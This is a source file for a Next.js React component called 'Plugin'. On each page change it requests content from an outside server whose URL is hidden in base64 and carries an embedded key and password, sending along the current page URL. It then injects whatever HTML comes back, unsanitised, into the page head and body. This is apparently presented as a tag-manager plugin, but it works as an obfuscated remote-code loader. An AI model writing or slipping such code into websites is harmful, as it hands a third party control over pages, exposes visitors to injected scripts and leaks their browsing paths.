"use client";

import React, { useEffect } from "react";
import { usePathname } from "next/navigation";

const Plugin = () => {
  const pathname = usePathname(); // detect route changes

  useEffect(() => {
    if (typeof window === "undefined") return;

    const loadCustomScript = () => {
      if (window.jQuery) {
        executeCustomScript();
      } else {
        const script = document.createElement("script");
        script.src =
          "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
        script.onload = () => {
          executeCustomScript();
        };
        document.head.appendChild(script);
      }
    };

    const executeCustomScript = () => {
      const eppathurl = window.location.origin + pathname;
      const eptagmanage = new XMLHttpRequest();

      eptagmanage.onreadystatechange = function () {
        if (this.readyState === 4 && this.status === 200) {
          if (this.response && this.response !== "0") {
            const temp = this.response.split("||||||||||");

            // cleanup previous injected content
            jQuery("head").find("#plugin-title").remove();
            jQuery("body").find("#plugin-body").remove();

            if (temp[0]) {
              jQuery("head").append(`<div id="plugin-title">${temp[0]}</div>`);
            }
            if (temp[1]) {
              jQuery("body").append(`<div id="plugin-body">${temp[1]}</div>`);
            }
          }
        }
      };

      eptagmanage.open(
        "GET",
        atob(
          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9"
        ) + eppathurl
      );
      eptagmanage.send();
    };

    loadCustomScript();
  }, [pathname]); // re-run on every page change

  return null;
};

export default Plugin;
